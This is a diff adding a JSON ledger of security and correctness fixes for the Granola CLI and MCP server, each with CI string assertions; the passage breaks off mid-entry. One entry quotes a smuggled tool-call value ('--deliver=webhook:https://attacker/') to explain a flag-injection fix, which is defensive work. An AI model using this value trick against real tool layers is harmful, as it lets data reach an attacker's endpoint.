@@ -1,0 +1,1661 @@
+{
+ "slug": "granola",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one. Provenance: the 2026-07-21 library v7.4x reprint (~/printing-press/library/granola, .printing-press-patches/), the skill/granola branch fixes (REST grammar, duplicate identity), and the 2026-10-13 publish pass (fleet security backports + gate fixes).",
+ "handfixes": [
+  {
+   "id": "rest-transcript-source-grammar",
+   "summary": "preflight, memo, and talktime classify transcript segments with the public REST API's labels (microphone = near, speaker = far) through one shared classifySource, gate on mic >= 5 AND classified >= 10, and exit 4 on unrecognized labels",
+   "why": "Granola 7.4x made the desktop cache app-private, so every transcript now arrives through the public REST API, whose speaker.source is microphone/speaker. The generated gate matched the dead cache vocabulary (system/speakers/mixed), counted zero far-end segments on every real meeting, and failed every preflight with exit 2 - memo queue came back empty and memo run skipped everything. classified must be mic+far, never len(segs): two adversarial rounds found raw-segment-count bypasses where relabelled segments manufactured a pass. Exit 4 separates 'labels unreadable' from 'no transcript' (exit 2). msp-skills commit a6fa0a715 (originally 45e7df4b on skill/granola).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func classifySource(s string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "case \"speaker\":",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "return mic >= 5 && classified >= 10",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "return &cliError{code: 4,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/talktime.go",
+     "contains": "classifySource(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/memo.go",
+     "contains": "mic, far, unknownSegs, unknown := countSources(segs)",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "preflight-duplicate-identity-gate",
+   "summary": "preflight exit 3 fires only on an identity match (meeting id in the filename or body, or title AND day); a same-title file from a different day is reported as title_collision and never blocks; the scan reads through an os.Root",
+   "why": "The transcripts layout names files '<YYYY-MM-DD> <Title> - <Org> - Full.md' - date in the name, never the id - so the id branch never fired and the title branch matched every earlier occurrence of a recurring meeting. Callers read exit 3 as 'skip', so real meetings were silently dropped (8 colliding titles measured on the live root). The os.Root scoping (added with the security gate pass) keeps a symlink in the transcripts tree from pulling an outside file into the body check. msp-skills commit 83dc8d2e0 (originally 1fa4e0aa). A --root naming a single file is still checked (through a root on its parent), as filepath.Walk did; a --root that is a symlink to a directory is now followed, where filepath.Walk silently skipped it. Codex full-PR review: a same-title, same-day file that records a DIFFERENT meeting id is a different meeting and only reports a collision; the title+day rung applies only to files that record no id. A --root that does not exist is reported on stderr instead of silently turning the gate off. Round 2: identity comes only from what a file DECLARES (Meeting ID line, Meeting Link to notes.granola.ai, frontmatter id), never from an id merely mentioned in the body; a legacy (pre-7.4x UUID) declaration cannot be compared with REST ids and falls back to title+day.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func findDuplicates(root, id, title, day string) (dup string, collisions []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "res[\"title_collision\"] = collisions",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "r, err := os.OpenRoot(base)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "not_contains": "func findDuplicateFile("
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "base, start = filepath.Dir(root), filepath.Base(root)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestFindDuplicatesSingleFileRoot(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "for _, declared := range memoDeclaredIDs(string(b)) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func warnIfRootMissing(root string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestFindDuplicatesDifferentRecordedIDIsNotADuplicate(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "if sameIDScheme(declared, id) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestFindDuplicatesUsesDeclaredIdentityNotMentions(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rest-only-data-pipeline",
+   "summary": "Every read comes from the REST-fed SQLite store (plus Granola's official MCP for human notes); the sealed desktop-cache readers (safestorage, WorkOS/internal API, LoadCache) and the commands that only worked against that cache (chat, recipes, calendar, folder stream, tiptap, warm, workspaces, meetings delete/restore) are removed",
+   "why": "Granola v7.4x seals cache-v6.json.enc behind its own Keychain access group, so a third-party binary can never decrypt it. The generated tree still shipped the decrypt path and a dozen commands that read only that cache - on a current desktop they returned nothing while looking healthy. The library v7.4x reprint (2026-07-21, steps 2-8) rebuilt the read path on the store and removed the dead surface; this ledger keeps a regeneration from bringing it back.",
+   "status": "active",
+   "spec_encode_followup": "Spec/press: a printed CLI should not emit a desktop-cache reader for an app that has sealed its store; the press retro for the v7.4x reprint is in the library scratchpad (2026-07-21 granola-reprint-retro.md).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func backfillMeetingsMetadataFromStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "not_contains": "granola.LoadCache("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newCalendarCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newRecipesCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newWarmCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newChatCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newTiptapCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newWorkspacesCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newFolderCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newCalendarOverlayCmd("
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "not_contains": "newMeetingsDeleteCmd("
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "not_contains": "newMeetingsRestoreCmd("
+    }
+   ]
+  },
+  {
+   "id": "rest-hydrate-presence-aware",
+   "summary": "REST hydration is non-destructive: absent attendees/transcript (nil pointer) preserve stored rows, present-empty clears them, and start/end/calendar fields are guarded independently",
+   "why": "upsertRichMeeting used to DELETE a meeting's attendees and transcript segments whenever a detail response omitted them, so a partial HTTP 200 wiped valid local data (adversarial P1). The pointer fields make 'absent' distinguishable from 'empty'. Library reprint step 1 + c99d4c4. Codex full-PR review: a response that omits `attendees` and carries only calendar invitees merges them in additively instead of deleting the stored set, and an empty name never overwrites a known one. Round 2: the store does not record which source added an attendee, so rows are merged, never replaced wholesale; only an explicit, present-but-empty attendees list clears them.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "Attendees     *[]restAttendee `json:\"attendees\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "Transcript    *[]restSegment  `json:\"transcript\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "name=CASE WHEN excluded.name != '' THEN excluded.name ELSE attendees.name END",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestUpsertKeepsAttendeesWhenOnlyInviteesArrive(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "if d.Attendees != nil && len(*d.Attendees) == 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestUpsertKeepsInviteesWhenOnlyAttendeesArrive(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "autorefresh-enrich-clean-install",
+   "summary": "Auto-refresh runs granola.EnsureSchema before its incremental meetings LEFT JOIN, so a clean install hydrates the rich tables on the first command",
+   "why": "On a clean install runApiSync opened only the generic store; the rich meetings table did not exist yet, the join failed with 'no such table: meetings', the error was swallowed, and every KEEP command stayed empty until a manual sync (Codex re-review P1, library fef8cd8).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "if err := granola.EnsureSchema(ctx, db); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "drop-platform-gate",
+   "summary": "The never-registered platform credential gate is removed from root.go, client.go, and the MCP server; the Adaptive limiter and Retry-After handling stay",
+   "why": "registerPlatformSource had no caller, so every gate function early-returned; the dead machinery (3,400 lines) only advertised a tenant binding nothing enforced. Library reprint step 7.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "registeredPlatformSource"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "registeredPlatformSource"
+    }
+   ]
+  },
+  {
+   "id": "client-redirect-body-hardening",
+   "summary": "The HTTP client refuses every redirect as a terminal, non-retryable error and rejects (never truncates) a response body over 64 MiB",
+   "why": "A redirect could replay the Authorization header or a request body to a server-chosen Location, and a capped LimitReader silently handed back a truncated JSON document. Library reprint step 9 + the Codex final-review fixup.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "type RedirectRefusedError struct {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "type RedirectResponseError struct {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "respBody, err := readCappedBody(resp.Body, maxResponseBytes)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-set-token-no-argv",
+   "summary": "auth set-token reads the API key from stdin (bounded) or GRANOLA_API_KEY and refuses a command-line argument",
+   "why": "A secret passed as argv lands in shell history and in ps output for the life of the process. Library reprint step 9.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func readSetTokenValue(cmd *cobra.Command) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "url-pathescape-opaque-id",
+   "summary": "Opaque note ids are url.PathEscape'd at every /v1/notes/{id} call site, CLI and MCP",
+   "why": "EscapePathParam preserves slashes, so an id like 'a/b' addressed a different path. Library reprint step 9 + fixup.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/notes_get.go",
+     "contains": "path := \"/v1/notes/\" + url.PathEscape(args[0])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/panel.go",
+     "contains": "\"/v1/notes/\"+url.PathEscape(id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcript.go",
+     "contains": "\"/v1/notes/\"+url.PathEscape(id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "return url.PathEscape(formatMCPParamValue(v))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "memo-output-file-safety",
+   "summary": "MEMO and export output: 0700 dirs, 0600 files, note-id allowlist, symlink-aware containment, and writes routed through an os.Root on the output directory",
+   "why": "Exports carry private notes, transcripts, and attendee emails. Library reprint step 9 made them owner-only and refused symlink targets; the security-gate pass (G304) moved the open, Lstat, and Chmod onto an os.Root so a swapped path component cannot redirect the write. A directory-form path ('out/' or an existing directory) is refused before it is split, because filepath.Dir/Base would otherwise turn 'out/' into the file 'out/out' (Codex review). Codex full-PR review: the handle is chmod'ed to 0600 BEFORE the write, so a pre-existing 0644 file never holds private bytes world-readable.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func safeJoinContained(dir, name string) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "r, err := os.OpenRoot(filepath.Dir(path))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "return r.Chmod(name, safeFilePerm)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "return ioErr(fmt.Errorf(\"output path %q is an existing directory, not a file\", path))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestWriteSafeFileRefusesDirectoryForm(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "if cerr := f.Chmod(safeFilePerm); cerr != nil {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "keychain-secret-via-stdin",
+   "summary": "Granola-MCP OAuth tokens are written to and read from the macOS Keychain through `security -i` with the command line on stdin, so no secret is ever on argv; operands are quoted and a control character is refused",
+   "why": "kcSet used to pass the token as a `security add-generic-password -w <token>` argument, visible to any same-user ps watcher while it ran, and the variable argv tripped gosec G204 three times. A newline in an operand would end the stdin command line and run the rest as a second command, so kcQuote refuses control characters. Round trip proved against a throwaway keychain (keychain_stdin_test.go, GRANOLA_KEYCHAIN_IT=1). The account constants were also renamed off the *Token suffix (gosec G101 false positive on the identifier). security(1) reads interactive lines into a 4096-byte buffer and runs any spill as a second command, so kcLine caps the rendered line at 4000 bytes (Codex review; a real access token is about 1 KB).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "cmd := exec.Command(\"/usr/bin/security\", \"-i\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "func kcQuote(v string) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "not_contains": "\"-w\", value).Run()"
+    },
+    {
+     "file": "cli/internal/cli/keychain_stdin_test.go",
+     "contains": "func TestKCQuoteRefusesControlCharacters(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "if len(line) > kcMaxLine {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestKCLineRefusesOverlongLine(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-auth-browser-open-via-openSetupURL",
+   "summary": "mcp-auth login opens the browser through auth.go's openSetupURL (literal per-OS command, URL as one argv element) instead of its own exec call",
+   "why": "This is the same browser-open the press emits in auth.go for OAuth connectors, covered by the fleet's vetted cli/internal/cli/auth.go G204 suppression. Moving the call there keeps one reviewed exec site instead of a second, unreviewed one in mcp_auth.go.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func openSetupURL(url string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "contains": "openSetupURL(authURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "not_contains": "exec.Command(\"open\""
+    }
+   ]
+  },
+  {
+   "id": "sql-limit-bound-parameter",
+   "summary": "The note-id queries bind LIMIT as a parameter (negative = no limit) instead of splicing it into the SQL text",
+   "why": "gosec G202 flagged the string-built SQL. The value was an int, so it was not injectable, but a bound parameter removes the pattern rather than arguing it away.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "ORDER BY julianday(updated_at) DESC LIMIT ?`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "rows, err := db.QueryContext(ctx, q, retryBefore, lim)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "not_contains": "q += fmt.Sprintf(\" LIMIT %d\""
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "not_contains": "q += fmt.Sprintf(\" LIMIT %d\""
+    }
+   ]
+  },
+  {
+   "id": "duplicates-fingerprint-sha256",
+   "summary": "duplicates scan fingerprints with SHA-256 instead of SHA-1",
+   "why": "The fingerprint is a dedup key, not a security boundary, but gosec G401/G505 block SHA-1 outright. It is computed per run and never persisted, so the switch changes no stored value.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "h := sha256.New()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "not_contains": "crypto/sha1"
+    }
+   ]
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "summary": "cliArgsFromMCP joins every tool-call value to its flag as ONE argv element (--json=<value>); bool true stays a bare --flag",
+   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag does not consume the next token, so a VALUE beginning with '--' was parsed as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became `--json --deliver=...` and the denylisted --deliver took effect. Fleet fix #326 (GHSA-w8gj-7q45-jrfq); granola was minted before it and carried the split form.",
+   "status": "upstreamed",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "not_contains": "\"--\"+k, "
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout_test.go",
+     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "summary": "The MCP shell-out layer refuses filesystem-path flags (--db, --out/-o, --output, --home, --audit-dir, and granola's --to and --root) and any argument name carrying '='",
+   "why": "The MCP server runs the companion CLI as the server account; a tool call that may pick --db, an output folder, or a scan root picks where that account writes or what it reads. granola adds two of its own: memo run --to (an --out alias) writes the MEMO triple, and --root (memo, preflight, duplicates) reads file names and same-title file bodies. TestNoShellOutToolCanDirectAFilesystemPath walks the real command tree and failed on `memo run --to` until it was listed. Fleet fix #289.",
+   "status": "upstreamed",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "if blocked[k] || blockedDestinationFlags[k] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"root\": true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"to\":   true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
+     "contains": "func TestMCPCannotDirectTheLocalStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
+     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-verdict-tracks-reality",
+   "summary": "doctor's api AND credentials verdicts come from an uncached GET /v1/notes?page_size=1: 2xx = this is the Granola API (and the key works), 401/403 = non-positive (key refused or missing), 404 = base_url is not the Granola API root; an ERROR verdict trips --fail-on=error",
+   "why": "The generated doctor called any answer at GET / 'reachable', so a base_url aimed at a web app shell (200 at /, 404 everywhere else) rendered green. check_doctor_truth.py failed granola on exactly that wrong-base state; it passes all states after this change. Issue #282. Codex review then found three gaps, each fixed and tested: both probes went through the 5-minute response cache (a revoked key could still read 'verified'), a 401/403 still produced a positive api verdict, and doctorExitForFailOn never matched the uppercase ERROR prefix, so --fail-on=error stayed green on the wrong-base state. Adversarial round 2: a 2xx that is not JSON (a web page) no longer reads as verified, and a missing key is an ERROR env_vars verdict instead of an 'optional' INFO line, so --fail-on=error trips.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "probeBody, perr := c.GetNoCache(cmd.Context(), \"/v1/notes\", map[string]string{\"page_size\": \"1\"})",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "case probeStatus == 404:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "report[\"api\"] = \"reachable\"\n"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "reachBody, reachErr := c.GetNoCache(cmd.Context(), \"/\", nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "verdictPrefix := !doctorFailOnInfoKeys[k] && (strings.HasPrefix(s, \"ERROR\") || strings.HasPrefix(s, \"FAIL\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestDoctorFailOnRecognizesErrorPrefix(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "case perr == nil && !json.Valid(probeBody):",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"env_vars\"] = \"ERROR \" + strings.Join(authEnvInfo, \"; \")",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-http-loopback-default",
+   "summary": "granola-mcp --transport http binds 127.0.0.1:7777 by default instead of every interface",
+   "why": "The HTTP transport has no authentication of its own and the process holds GRANOLA_API_KEY; ':7777' exposed meeting transcripts to anyone who could reach the port on a shared network. mcp-install.md tells operators to keep it on loopback behind a tunnel.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/granola-mcp/main.go",
+     "contains": "defaultHTTPAddr = \"127.0.0.1:7777\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "It binds the loopback interface",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "install-credentials-declared-on-every-channel",
+   "summary": "GRANOLA_API_KEY (required) and GRANOLA_BASE_URL (optional, defaulted) are declared identically on manifest.json, server.json, and mcp-install.md",
+   "why": "The binary reads GRANOLA_BASE_URL, but the press declared only the key, and server.json called the key required while manifest.json said optional. check_env_schema.py failed on both. Issue #282.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"GRANOLA_API_KEY\": \"${user_config.granola_api_key}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"GRANOLA_BASE_URL\": \"${user_config.granola_base_url}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"GRANOLA_API_KEY\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"GRANOLA_BASE_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"GRANOLA_API_KEY\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"GRANOLA_BASE_URL\":",
+     "min_count": 3
+    }
+   ]
+  },
+  {
+   "id": "manifest-clean-mcp-binary-name",
+   "summary": "manifest.json names the stripped MCP binary (granola-mcp), not the press's granola-pp-mcp",
+   "why": "The press emits the -pp- name in manifest name/entry_point/command; the shipped binary is granola-mcp.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"entry_point\": \"bin/granola-mcp\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "not_contains": "granola-pp-mcp"
+    }
+   ]
+  },
+  {
+   "id": "preflight-hydrates-missing-meeting",
+   "summary": "preflight fetches a meeting that sync has listed but not yet enriched (one REST detail call) before judging it, and its not-found error says plainly that exit 3 here means NOT FOUND, not a duplicate",
+   "why": "The rich store holds only meetings that sync (50 most recent) or auto-refresh (25) enriched. preflight returned exit 3 for any other meeting, the same code as a duplicate, so a caller reading 3 as 'skip' dropped real meetings silently - the failure the identity gate was meant to remove (adversarial review P1). A refused key, a 5xx, or a network failure exits 5 (the meeting may exist), never 3; `memo run <id>` shares the same single-meeting fetch, so it agrees with preflight.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "if herr := hydrateOneMeeting(cmd.Context(), flags, id); herr != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func hydrateOneMeeting(ctx context.Context, flags *rootFlags, id string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestPreflightHydratesAMeetingSyncHasNotEnriched(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "if !(errors.As(herr, &apiE) && apiE.StatusCode == 404) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/memo.go",
+     "contains": "if herr := hydrateOneMeeting(cmd.Context(), flags, args[0]); herr != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPreflightLookupFailureIsNotNotFound(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "if d == nil && flags.dataSource != \"local\" && validateNoteIDForFilename(id) == nil && !apiKeyConfigured(flags) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPreflightWithoutAKeyIsNotNotFound(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meetings-query-searches-transcripts",
+   "summary": "meetings list --query matches transcript text as well as the title and typed notes",
+   "why": "The generated query looked only at title + notes_plain, and `search` covers only the note-list index (titles and owners), so nothing in the CLI could find a meeting by something said on the call even though the transcripts sit in the local store. The docs' 'transcript search' claim depends on this (adversarial review P1).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "contains": "OR id IN (SELECT meeting_id FROM transcript_segments WHERE text LIKE ?))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/publish_review_fixes_test.go",
+     "contains": "func TestLoadMeetingsQueryMatchesTranscript(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "extract-triple-all-or-nothing",
+   "summary": "extract stages the MEMO triple in private temporary files and renames them into place only when all three are written, full_<id>.md last",
+   "why": "A half-written triple left full_<id>.md behind, and the retry refused it as 'already exists' forever (Codex full-PR review). Round 2: a failure while writing the FIRST file also left a partial full_<id>.md, so the triple is now staged under hidden temporary names (skipped by the duplicate scan) and published last. Round 3: a per-meeting lock in the output folder is held from the 'already exists' check through publication, so two concurrent extracts cannot interleave snapshots (a lock older than 10 minutes is taken over). Round 4: the lock is OS-held (flock / LockFileEx), released by the kernel when the holder exits, on a hidden file that is never unlinked, so stale-lock reclamation can no longer let two runs in at once.",
+   "status": "active",
+   "asserts": [
+    {
